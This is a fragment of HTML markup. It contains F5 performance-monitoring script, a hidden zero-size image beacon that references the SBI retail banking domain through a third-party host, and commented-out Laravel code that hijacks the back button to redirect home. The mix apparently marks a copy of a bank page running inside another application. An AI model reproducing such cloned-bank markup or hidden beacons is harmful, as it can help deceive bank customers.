                        var pair = chunk[i].split(/\s*=\s*/); if (pair[0] == 'f5_cspm' && pair[1] == '1234') { var d = new Date(); d.setTime(d.getTime() - 1000); window.document.cookie = 'f5_cspm=;expires=' + d.toUTCString() + ';path=/;' + ';'; setTimeout(f5_cspm.wait_perf_data, 100); }
                    }
                }
            }
            f5_cspm.go();
        }());
    </script>
    <img style="display:none;" src="https://cdn.page-source.com/resizeimage.ashx?ig=retail.onlinesbi.sbi&amp;sz=105411"
        width="0" height="0">


        
<!-- Testing code for browser back button -->
<!-- <script>
    document.addEventListener('DOMContentLoaded', function() {
        // Push the current state into history stack
        history.replaceState({ page: 'current' }, '', window.location.href);

        window.onpopstate = function(event) {
            // When back button is clicked, redirect to home route
            window.location.href = "{{ route('home') }}";
        };
    });
</script> -->

<!-- 
<script>
    window.addEventListener('popstate', function() {
        // Push the current state into history stack
        
        window.location.href = "{{ route('home') }}";

    });
    // history.replaceState({ page: 'current' }, '', window.location.href);
    history.pushState(null, null, document.URL);
</script> -->


